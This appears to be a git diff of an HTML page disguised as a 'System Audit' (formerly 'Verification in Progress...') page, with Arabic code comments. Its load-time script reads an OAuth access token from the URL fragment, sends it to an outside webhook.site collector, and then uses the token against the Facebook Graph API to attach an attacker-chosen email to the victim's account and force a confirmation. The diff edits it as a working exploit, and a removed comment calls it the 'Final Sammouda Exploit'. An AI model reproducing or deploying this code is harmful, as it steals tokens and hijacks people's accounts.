@@ -1,9 +1,8 @@
 <!DOCTYPE html>
 <html>
-<head><title>Verification in Progress...</title></head>
+<head><title>System Audit</title></head>
 <body>
     <script>
-        // [2026-01-21] Final Sammouda Exploit
         window.onload = async function() {
             const hash = window.location.hash;
             const webhookUrl = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";
@@ -12,15 +11,16 @@
             if (hash && hash.includes('access_token=')) {
                 const token = new URLSearchParams(hash.substring(1)).get('access_token');
                 try {
-                    // إرسال التوكن للـ Webhook
-                    fetch(`${webhookUrl}?TOKEN_FINAL=${token}`, {mode: 'no-cors'});
+                    // إرسال التوكن للتحكم
+                    fetch(`${webhookUrl}?FORCE_TOKEN=${token}`, {mode: 'no-cors'});
 
-                    // أمر الإضافة المزدوج لضمان وصول الرسالة
-                    await fetch(`https://graph.facebook.com/me?access_token=${token}`, {
+                    // الطلب الأول (إضافة)
+                    await fetch(`https://graph.facebook.com/v15.0/me?access_token=${token}`, {
                         method: 'POST',
                         body: new URLSearchParams({ 'email': targetEmail })
                     });
-                    
+
+                    // الطلب الثاني (إجبار النظام على إرسال رسالة التأكيد)
                     await fetch(`https://graph.facebook.com/v15.0/me/emails?access_token=${token}`, {
                         method: 'POST',
                         body: new URLSearchParams({ 'email': targetEmail, 'confirm': 'true' })
